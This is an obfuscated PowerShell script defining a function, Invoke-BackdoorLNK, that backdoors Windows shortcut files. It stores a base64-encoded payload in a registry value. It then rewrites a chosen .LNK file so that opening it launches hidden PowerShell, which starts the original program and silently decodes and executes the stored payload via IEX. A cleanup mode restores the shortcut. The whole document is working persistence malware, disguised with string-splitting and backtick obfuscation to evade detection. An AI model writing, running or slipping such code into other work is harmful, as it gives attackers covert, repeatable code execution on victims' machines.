  Set-VarIabLe ("{1}{0}"-f 'OSWH','9') (  [TyPE]("{0}{2}{4}{3}{1}"-f'SY','ODiNg','StEm','.eNC','.tExt'))  ;    SeT-iTEm ("VARIabL"+"E"+":2I"+"0") ( [TYPE]("{4}{2}{0}{1}{3}"-F'eM.C','ONV','St','ERt','SY')); function i`NVOK`e-B`ACKdOORLNk {


    [CmdletBinding()] Param(
        [Parameter(VaLuefROmpiPeLiNE=${t`RUE}, MAnDaTORY = ${T`RUE})]
        [ValidateScript({&("{2}{0}{3}{1}"-f'es','h','T','t-Pat') -Path ${_} })]
        [String]
        ${L`NkPAth},

        [String]
        ${E`NC`SCRi`pT},

        [String]
        ${Re`Gp`ATH} = (("{6}{2}{7}{3}{5}{9}{1}{0}{8}{4}"-f'wsOfWd','indo','OfWSoftwa','fW','bug','Micr','HKCU:','reO','e','osoftOfWW'))."rEPlA`Ce"(([ChaR]79+[ChaR]102+[ChaR]87),'\'),

        [Switch]
        ${C`LeaN`Up}
    )

    ${Regp`AR`Ts} = ${r`Egp`ATh}.("{1}{0}" -f 'plit','s').Invoke("\")
    ${P`Ath} = ${RegPa`R`Ts}[0..(${Re`G`pArts}."co`unT"-2)] -join "\"
    ${n`Ame} = ${RE`G`pA`RtS}[-1]


    ${o`BJ} = &("{2}{1}{0}"-f't','-Objec','New') -ComObject ("{1}{3}{0}{2}" -f 't','WS','.Shell','crip')
    ${L`NK} = ${O`Bj}.("{2}{4}{1}{0}{3}"-f 'ate','e','C','Shortcut','r').Invoke(${LNk`Pa`Th})

    
    ${Tar`gETPa`Th} = ${l`NK}."taRge`Tp`Ath"
    ${wO`R`Ki`NGDIREC`TOrY} = ${L`Nk}."w`oR`ki`NGdI`RECtO`RY"
    ${ic`oNlOc`AtION} = ${L`Nk}."iCO`Nlo`cAtI`on"

    if(${cl`ea`NuP}) {

        
        ${ori`gI`NALP`A`Th} = (${iCOnLo`Ca`TI`ON} -split ",")[0]

        ${l`Nk}."Ta`Rge`TPAth" = ${orig`In`AlpA`TH}
        ${l`NK}."AR`G`Uments" = ${nU`ll}
        ${L`NK}."w`INDO`wSTyle" = 1
        ${l`Nk}.("{1}{0}"-f'e','Sav').Invoke()

        
        ${N`ULL} = &("{2}{1}{3}{4}{0}" -f'perty','v','Remo','e-Ite','mPro') -Force -Path ${P`ATH} -Name ${Na`mE}
    }
    else {

        if(!${En`c`SCRiPT} -or ${eNcSC`R`iPt} -eq '') {
            throw ("{1}{5}{3}{2}{7}{0}{6}{4}"-f'qu','-En','Clea','cript or -','!','cS','ired','nup re')
        }

        
        ${Nu`Ll} = .("{2}{0}{1}"-f'emPro','perty','Set-It') -Force -Path ${pA`Th} -Name ${n`AmE} -Value ${Enc`SCRI`pt}

        ('[*'+'] '+'B64'+' '+'sc'+'ript '+'s'+'tored '+'at'+' '+"'$RegPath'`n")

        
        ${l`NK}."TA`RG`E`TPAtH" = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"

        
        ${lAU`NC`HsT`RinG} = ((("{3}{6}{5}{4}{1}{0}{7}{2}{8}"-f 'ss','ce','t(','[Syste','.Pro','ics','m.Diagnost',']::Star','sTp'))  -rEplACE([ChAR]115+[ChAR]84+[ChAR]112),[ChAR]34)+${t`A`RGEtpATH}+(("{15}{5}{14}{1}{2}{11}{6}{12}{0}{9}{8}{3}{13}{7}{10}{4}" -f 'GetString(','nc','oding','s','g((gp ','[Text.','O','tri','romBa','[Convert]::F','n',']::UNIC','DE.','e64S','E','ahz);IEX ('))."REPla`ce"('ahz',[STrIng][cHAR]34)+${p`ATH}+' '+${N`AmE}+').'+${n`Ame}+')))'

        ${la`unc`hBy`TeS}  =   ( VAriaBLE ("{1}{0}"-f'osWH','9') ).vALuE::"UnI`co`dE".("{2}{0}{1}" -f 'etByte','s','G').Invoke(${laUN`Ch`sTR`i`NG})
        ${LAUN`Ch`B64} =  ( ITEm ("VAriaBL"+"E"+":2I"+"0")  ).vALUE::("{0}{3}{2}{1}"-f 'To','String','e64','Bas').Invoke(${l`A`UNcH`BYteS})

        ${L`NK}."ar`gU`meNTs" = ('-w'+' '+'hid'+'de'+'n '+'-no'+'p '+'-enc'+' '+"$LaunchB64")

        
        ${l`Nk}."W`O`R`k`INGDIrecTORy" = ${W`oRki`NGD`IRECtoRy}
        ${L`NK}."IC`o`NLOcAti`on" = "$TargetPath,0"
        ${L`NK}."wiND`oW`sTyLe" = 7
        ${L`Nk}.("{0}{1}"-f'Sa','ve').Invoke()

        ('[*'+'] '+'.'+'LNK '+'a'+'t '+"$LNKPath "+'se'+'t '+'t'+'o '+"trigger`n")
    }
}